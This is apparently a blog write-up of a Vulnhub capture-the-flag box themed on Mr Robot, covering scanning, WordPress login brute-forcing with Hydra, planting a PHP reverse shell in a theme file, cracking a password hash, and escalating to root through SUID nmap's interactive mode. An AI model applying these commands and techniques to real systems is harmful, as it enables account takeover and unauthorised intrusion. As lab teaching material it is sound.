# [**Home**](https://opalsec.github.io)

![Banner](https://opalsec.github.io/blog/assets/images/MrRobot/Banner.png)

# Contents:

1. Enumeration
2. Exploitation
      - License.txt
      - Robots.txt
   - Account Enumeration
     - /wp-login/
       - Brute-Forcing with Hydra's HTTP-FORM-POST
         - Username Enumeration
         - Password Enumeration
3. Getting User-Level Access
   - Attempt #1: Malicious Wordpress Theme
   - Attempt #2: Malicious Wordpress Plugin
   - Attempt #3: Keep It Simple, Stupid
4. Privilege Escalation (robot)
5. Privilege Escalation (root)

# Enumeration
As always, start with an nmap scan to identify listening ports and services:

```
nmap -A -vv -Pn -oA /home/montana/Documents/MrRobot/allscan 192.168.58.131
```

Providing us with this:
```
Nmap scan report for 192.168.58.131
Host is up, received arp-response (0.00035s latency).
Scanned at 2018-08-19 14:53:26 AEST for 35s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 64
80/tcp  open   http     syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
MAC Address: 00:0C:29:03:64:10 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=8/19%OT=80%CT=22%CU=%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=5B
OS:78F7E9%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=
OS:8)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5
OS:B4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=712
OS:0)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 198.839 days (since Thu Feb  1 18:45:15 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 192.168.58.131

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 19 14:54:01 2018 -- 1 IP address (1 host up) scanned in 35.85 seconds
```

# Exploitation

Browsing to Port 80 displays a fake boot sequence and the terminal in the picture at the top of this post. There's no obvious vulnerabilities in terms of input options or in the source, so I ran Nikto to get a quick overview of what's going on:

```
root@Cortana:/home/montana# nikto -h 192.168.58.131
	- Nikto v2.1.6
	---------------------------------------------------------------------------
	+ Target IP:          192.168.58.131
	+ Target Hostname:    192.168.58.131
	+ Target Port:        80
	+ Start Time:         2018-09-04 10:45:46 (GMT10)
	---------------------------------------------------------------------------
	+ Server: Apache
	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
	+ Retrieved x-powered-by header: PHP/5.5.29
	+ No CGI Directories found (use '-C all' to force check all possible dirs)
	+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad 
	+ Uncommon header 'tcn' found, with contents: list
	+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
	+ OSVDB-3092: /admin/: This might be interesting...
	+ OSVDB-3092: /readme: This might be interesting...
	+ Uncommon header 'link' found, with contents: <http://192.168.58.131/?p=23>; rel=shortlink
	+ /wp-links-opml.php: This WordPress script reveals the installed version.
	+ OSVDB-3092: /license.txt: License file found may identify site software.
	+ /admin/index.html: Admin login page/section found.
	+ Cookie wordpress_test_cookie created without the httponly flag
	+ /wp-login/: Admin login page/section found.
	+ /wordpress/: A Wordpress installation was found.
	+ /wp-admin/wp-login.php: Wordpress login found
	+ /blog/wp-login.php: Wordpress login found
	+ /wp-login.php: Wordpress login found
	+ 7535 requests: 0 error(s) and 18 item(s) reported on remote host
	+ End Time:           2018-09-04 10:48:58 (GMT10) (192 seconds)
	---------------------------------------------------------------------------
	+ 1 host(s) tested
```

### License.txt

I started by looking here, hoping it'd hint at vulnerable 3rd party plugins I could exploit:

![License](https://opalsec.github.io/blog/assets/images/MrRobot/License.png)

> _licks script and meows_

### Robots.txt

Usually an easy win on Vulnhub machines, and in keeping with the MrRobot theme, we got a dictionary file (fsocity.dic) and part 1 of a 3-part key:

![RobotsTxt](https://opalsec.github.io/blog/assets/images/MrRobot/RobotsTxt.png)

I retrieved these with a simple wget command, and looked at the next of the potential vulnerabilities

## Account Enumeration

### /wp-login/

The first thing I noticed the is "Lost your password?" option - if it provides useful error message, we could potentially use it to enumerate valid users:

![LostPassword](https://opalsec.github.io/blog/assets/images/MrRobot/LostPassword.png)

Confirming the supplied username or email address is invalid? We can work with that:

![Invalid](https://opalsec.github.io/blog/assets/images/MrRobot/Invalid.png)

#### Brute-Forcing with Hydra's HTTP-FORM-POST

The next step was to use Hydra's http-form-post module to bruteforce logins with the entries contained in the fsocity.dic file we discovered earlier:

##### Username Enumeration

This will iterate through POST requests to /wp-login.php?action=lostpassword, spoofing the user_login and user_pass values until it gets a response that **doesn't** contain "Invalid Username". It's using the fsocity.dic file to populate the user_login value, and the static password "fsociety" for each login. The task will use 10 threads, and output the results in a specified text file.

`hydra 192.168.58.131 http-form-post "/wp-login.php?action=lostpassword:user_login=^USER^&user_pass=^PASS^:Invalid username" -L /home/montana/Documents/MrRobot/fsocity.dic -p fsociety -t 10 -o /home/montana/Documents/MrRobot/hydra-http-post-attack.txt`

> **Comment:** You might've noticed there's no password field in the web form and that I set the parameter in Hydra anyway - this is simply because Hydra required me to set one for the command to run.

This confirms the usernames "Elliot" and "elliot" are valid:

![UserBrute](https://opalsec.github.io/blog/assets/images/MrRobot/UserBrute.png)

##### Password Enumeration

Now to bruteforce the password - to do this I need to:
1. Use the original Wordpress login form instead of the password reset one
2. Change the hydra syntax so I flip the wordlist to the password field, and use "Elliot" as a static username

There'll also be a different error message for an invalid password, so I did a failed login, changed this around, and ran it.

`hydra 192.168.58.131 http-form-post "/wp-login.php:user_login=^USER^&user_pass=^PASS^:The password you entered" -l Elliot -P /home/montana/Documents/MrRobot/fsocity.dic -t 10 -o /home/montana/Documents/MrRobot/hydra-http-post-attack.txt`

This "worked" immediately, saying I'd gotten all 10 correct passwords on the first run

![PassFail](https://opalsec.github.io/blog/assets/images/MrRobot/PassFail.png)

I knew that couldn't be right, and it hit me that I'd forgotten to check if the username and password field names had changed now that I was submitting POSTs to the login form - they had:

![LoginFields](https://opalsec.github.io/blog/assets/images/MrRobot/LoginFields.png)

So I changed this up and ran it again:

`hydra 192.168.58.131 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered" -l Elliot -P /home/montana/Documents/MrRobot/fsocity.dic -t 10 -o /home/montana/Documents/MrRobot/hydra-http-post-attack.txt`

After about 30 minutes, it'd attempted ~6800 combinations, and I started noticing values re-appearing - there were dupes! I culled this `(cat fsocity.dic | sort -u > fsocity_filtered.dic)` and holy shit did that make a difference, bringing it down from 858,160 entries to 11,451:

![Filter](https://opalsec.github.io/blog/assets/images/MrRobot/Filter.png)

Re-running the query, it completed in 9 minutes with a valid password result - lesson learned, cull the list if you can before running a brute force!

![PassBrute](https://opalsec.github.io/blog/assets/images/MrRobot/PassBrute.png)

## Getting User-Level Access

Logging in using the credentials I'd just obtained, I now needed to figure out how to get a shell

### Attempt #1: Malicious Wordpress Theme
[Reference:http://forum.top-hat-sec.com/index.php?topic=5758.0](http://forum.top-hat-sec.com/index.php?topic=5758.0)

The idea is to create a malicious theme with a php reverse shell encoded in header.php which is called by index.php.

It didn't take a lot to do - just create the necessary resource files (style.css, header.php, index,php and comments.php) with junk text in the .css and comments.php files. In index.php, `<?php get_header(); ?>` will load header.php, running your shellcode. Theoretically.

I tried this multiple times, using a theme created myself, and a pre-packaged one that someone else had made. Unfortunately, neither worked.

### Attempt #2: Malicious Wordpress Plugin
[Reference:https://github.com/wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin)

How about creating and loading a malicious Wordpress plugin that would launch a reverse shell?

Very simple setup, just cloning the repo and entering the parameters for the listener - this python script automates the generation of the payload based on metasploit's wp_admin_shell_upload module and starts a listener. 
	
All you have to do is upload the malicious .zip file…which I did, but didn't get a reverse shell.

### Attempt #3: Keep It Simple, Stupid

Taking a step back, I thought about the basic mechanics of a web-based reverse shell - you browse to a compromised internet-accessible resource on the victim web server, causing a script to run and a shell to be served back. 

If I can create and edit pages, couldn't I just put my script on there and browse to it to get the shell?

Navigating through Appearance -> Editor, there were a number of .php files that I could hijack with my shell code. The stealthiest option would be to swap the content of the 404.php page, so I substituted it with [Pentest Monkey's PHP Reverse Shell File](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and saved the changes. 

![404](https://opalsec.github.io/blog/assets/images/MrRobot/404.png)

Starting netcat and browsing to /wp-content/themes/twentyfifteen/404.php, I landed my shell:

![UserShell](https://opalsec.github.io/blog/assets/images/MrRobot/UserShell.png)

> I then upgraded my shell using Python `python -c 'import pty; pty.spawn("/bin/bash")'` - you can find more ways to upgrade a dumb shell to enable command history and more [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

## Privilege Escalation (robot)

Navigating to /home/robot, I find two files - one is the 2nd key file that I can't view as my current user; the other is an MD5 hash of the password for the account "robot"

![RobotFiles](https://opalsec.github.io/blog/assets/images/MrRobot/RobotFiles.png)

The md5 password didn't crack with the fsocity.dic file, so I tried what normally works with CTF boxes - rockyou.txt:

![HashCracked](https://opalsec.github.io/blog/assets/images/MrRobot/HashCracked.png)

Using this password, I was able to su to "robot":

![robotSu](https://opalsec.github.io/blog/assets/images/MrRobot/robotSu.png)

As the user "robot" I was finally able to view the 2nd piece of the key: 

![Key2](https://opalsec.github.io/blog/assets/images/MrRobot/Key2.png)

## Privilege Escalation (root)

Given I haven't gotten root yet, I can only assume that's what's left to do to get the last piece of the key. 

I hadn't had much experience with Unix enumeration scripts or tools, so I decided to give PentestMonkey's unix-privesc-check script a go:

1. Hosted it with Python's SimpleHTTPServer, fetched it with wget to the /tmp directory
2. `chmod 755 privcheck`
3. `privcheck detailed > output.txt`

The output was a huge 32KB, so I just used grep on the string "WARNING", which indicates potential vulnerabilities which were identified:

![PrivCheckOutput](https://opalsec.github.io/blog/assets/images/MrRobot/PrivCheckOutput.png)

Even then, there was too much to sort through, so I ditched the results and did a search for files with the SetUID flag set to root - one of handful of easy wins to look out for on a nix box.

```
daemon@linux:/home/robot$ find / -user root -perm -4000 2>/dev/null               
	/bin/ping
	/bin/umount
	/bin/mount
	/bin/ping6
	/bin/su
	/usr/bin/passwd
	/usr/bin/newgrp
	/usr/bin/chsh
	/usr/bin/chfn
	/usr/bin/gpasswd
	/usr/bin/sudo
	/usr/local/bin/nmap
	/usr/lib/openssh/ssh-keysign
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
	/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
	/usr/lib/pt_chown
```

> This command searches from the base directory for files with the SETUID flag set to root, errors piped to dev/null

What stands out in the results was that nmap can be run with root privileges. One of the functions of nmap is that you can run an **interactive nmap session (`nmap --interactive`)**, which allows you to run shell commands with the prefix "!"

![nmapHelp](https://opalsec.github.io/blog/assets/images/MrRobot/nmapHelp.png)

One key thing to note is that invoking bash without the -p flag granted me bash as the user supplying the command, ignoring nmap's SUID flag - i.e. I got the bash terminal as **robot, not root**. Adding -p preserved the assigned uid, as shown in the euid being root.

Further explanation from the man page for bash: 
> If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS variable, if it appears in the environment, is ignored, and the effective user id is set to the real user id. **If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.**

![InteractiveExample](https://opalsec.github.io/blog/assets/images/MrRobot/InteractiveExample.png)

Now running as root, I'm able to get the final piece of the key:

![finalFlag](https://opalsec.github.io/blog/assets/images/MrRobot/finalFlag.png)
